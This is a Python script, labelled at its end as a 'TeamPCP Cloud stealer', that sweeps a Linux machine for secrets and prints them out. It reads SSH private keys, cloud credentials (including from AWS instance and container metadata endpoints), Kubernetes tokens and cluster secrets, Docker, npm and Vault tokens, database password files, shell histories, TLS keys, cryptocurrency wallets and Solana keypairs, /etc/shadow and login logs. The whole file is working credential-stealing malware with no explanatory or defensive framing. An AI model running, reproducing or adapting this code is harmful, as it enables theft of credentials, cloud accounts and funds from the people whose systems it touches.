import os,sys,stat,subprocess,glob

def emit(path):
    try:
        st=os.stat(path)
        if not stat.S_ISREG(st.st_mode):return
        with open(path,'rb') as fh:data=fh.read()
        sys.stdout.buffer.write(('\n=== '+path+' ===\n').encode())
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.write(b'\n')
    except OSError:pass

def emit_glob(pattern):
    for p in glob.glob(pattern,recursive=True):emit(p)

def run(cmd):
    try:
        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,timeout=10)
        if out:
            sys.stdout.buffer.write(('\n=== CMD: '+cmd+' ===\n').encode())
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.write(b'\n')
    except Exception:pass

def walk(roots,max_depth,match_fn):
    for root in roots:
        if not os.path.isdir(root):continue
        for dirpath,dirs,files in os.walk(root,followlinks=False):
            rel=os.path.relpath(dirpath,root)
            depth=0 if rel=='.' else rel.count(os.sep)+1
            if depth>=max_depth:dirs[:]=[];continue
            for fn in files:
                fp=os.path.join(dirpath,fn)
                if match_fn(fp,fn):emit(fp)

homes=[]
try:
    for e in os.scandir('/home'):
        if e.is_dir():homes.append(e.path)
except OSError:pass
homes.append('/root')
all_roots=homes+['/opt','/srv','/var/www','/app','/data','/var/lib','/tmp']

run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')

for h in homes+['/root']:
    for f in ['/.ssh/id_rsa','/.ssh/id_ed25519','/.ssh/id_ecdsa','/.ssh/id_dsa','/.ssh/authorized_keys','/.ssh/known_hosts','/.ssh/config']:
        emit(h+f)
    walk([h+'/.ssh'],2,lambda fp,fn:True)

walk(['/etc/ssh'],1,lambda fp,fn:fn.startswith('ssh_host') and fn.endswith('_key'))

for h in homes+['/root']:
    for f in ['/.git-credentials','/.gitconfig']:emit(h+f)

for h in homes+['/root']:
    emit(h+'/.aws/credentials')
    emit(h+'/.aws/config')

for d in ['.','..','../..']:
    for f in ['.env','.env.local','.env.production','.env.development','.env.staging','.env.test']:
        emit(d+'/'+f)
emit('/app/.env')
emit('/etc/environment')
walk(all_roots,6,lambda fp,fn:fn in {'.env','.env.local','.env.production','.env.development','.env.staging'})

run('env | grep AWS_')
run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')

for h in homes+['/root']:
    emit(h+'/.kube/config')
emit('/etc/kubernetes/admin.conf')
emit('/etc/kubernetes/kubelet.conf')
emit('/etc/kubernetes/controller-manager.conf')
emit('/etc/kubernetes/scheduler.conf')
emit('/var/run/secrets/kubernetes.io/serviceaccount/token')
emit('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
emit('/var/run/secrets/kubernetes.io/serviceaccount/namespace')
emit('/run/secrets/kubernetes.io/serviceaccount/token')
emit('/run/secrets/kubernetes.io/serviceaccount/ca.crt')
run('find /var/secrets /run/secrets -type f 2>/dev/null | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>/dev/null\'')
run('env | grep -i kube; env | grep -i k8s')
run('kubectl get secrets --all-namespaces -o json 2>/dev/null || true')

for h in homes+['/root']:
    walk([h+'/.config/gcloud'],4,lambda fp,fn:True)
emit('/root/.config/gcloud/application_default_credentials.json')
run('env | grep -i google; env | grep -i gcloud')
run('cat $GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null || true')

for h in homes+['/root']:
    walk([h+'/.azure'],3,lambda fp,fn:True)
run('env | grep -i azure')

for h in homes+['/root']:
    emit(h+'/.docker/config.json')
emit('/kaniko/.docker/config.json')
emit('/root/.docker/config.json')

for h in homes+['/root']:
    emit(h+'/.npmrc')
    emit(h+'/.vault-token')
    emit(h+'/.netrc')
    emit(h+'/.lftp/rc')
    emit(h+'/.msmtprc')
    emit(h+'/.my.cnf')
    emit(h+'/.pgpass')
    emit(h+'/.mongorc.js')
    for hist in ['/.bash_history','/.zsh_history','/.sh_history','/.mysql_history','/.psql_history','/.rediscli_history']:
        emit(h+hist)

emit('/var/lib/postgresql/.pgpass')
emit('/etc/mysql/my.cnf')
emit('/etc/redis/redis.conf')
emit('/etc/postfix/sasl_passwd')
emit('/etc/msmtprc')
emit('/etc/ldap/ldap.conf')
emit('/etc/openldap/ldap.conf')
emit('/etc/ldap.conf')
emit('/etc/ldap/slapd.conf')
emit('/etc/openldap/slapd.conf')
run('env | grep -iE "(DATABASE|DB_|MYSQL|POSTGRES|MONGO|REDIS|VAULT)"')

walk(['/etc/wireguard'],1,lambda fp,fn:fn.endswith('.conf'))
run('wg showconf all 2>/dev/null || true')

for h in homes+['/root']:
    walk([h+'/.helm'],3,lambda fp,fn:True)
for ci in ['terraform.tfvars','.gitlab-ci.yml','.travis.yml','Jenkinsfile','.drone.yml','Anchor.toml','ansible.cfg']:
    emit(ci)
walk(all_roots,4,lambda fp,fn:fn.endswith('.tfvars'))
walk(all_roots,4,lambda fp,fn:fn=='terraform.tfstate')

walk(['/etc/ssl/private'],1,lambda fp,fn:fn.endswith('.key'))
walk(['/etc/letsencrypt'],4,lambda fp,fn:fn.endswith('.pem'))
walk(all_roots,5,lambda fp,fn:os.path.splitext(fn)[1] in {'.pem','.key','.p12','.pfx'})

run('grep -r "hooks.slack.com\|discord.com/api/webhooks" . 2>/dev/null | head -20')
run('grep -rE "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" . --include="*.env*" --include="*.json" --include="*.yml" --include="*.yaml" 2>/dev/null | head -50')

for h in homes+['/root']:
    for coin in ['/.bitcoin/bitcoin.conf','/.litecoin/litecoin.conf','/.dogecoin/dogecoin.conf','/.zcash/zcash.conf','/.dashcore/dash.conf','/.ripple/rippled.cfg','/.bitmonero/bitmonero.conf']:
        emit(h+coin)
    walk([h+'/.bitcoin'],2,lambda fp,fn:fn.startswith('wallet') and fn.endswith('.dat'))
    walk([h+'/.ethereum/keystore'],1,lambda fp,fn:True)
    walk([h+'/.cardano'],3,lambda fp,fn:fn.endswith('.skey') or fn.endswith('.vkey'))
    walk([h+'/.config/solana'],3,lambda fp,fn:True)
    for sol in ['/validator-keypair.json','/vote-account-keypair.json','/authorized-withdrawer-keypair.json','/stake-account-keypair.json','/identity.json','/faucet-keypair.json']:
        emit(h+sol)
    walk([h+'/ledger'],3,lambda fp,fn:fn.endswith('.json') or fn.endswith('.bin'))

for sol_dir in ['/home/sol','/home/solana','/opt/solana','/solana','/app','/data']:
    emit(sol_dir+'/validator-keypair.json')

walk(['.'],8,lambda fp,fn:fn in {'id.json','keypair.json'} or (fn.endswith('-keypair.json') and 'keypair' in fn) or (fn.startswith('wallet') and fn.endswith('.json')))
walk(['.anchor','./target/deploy','./keys'],5,lambda fp,fn:fn.endswith('.json'))

run('env | grep -i solana')
run('grep -r "rpcuser\|rpcpassword\|rpcauth" /root /home 2>/dev/null | head -50')

emit('/etc/passwd')
emit('/etc/shadow')

run('cat /var/log/auth.log 2>/dev/null | grep Accepted | tail -200')
run('cat /var/log/secure 2>/dev/null | grep Accepted | tail -200')

## TeamPCP Cloud stealer 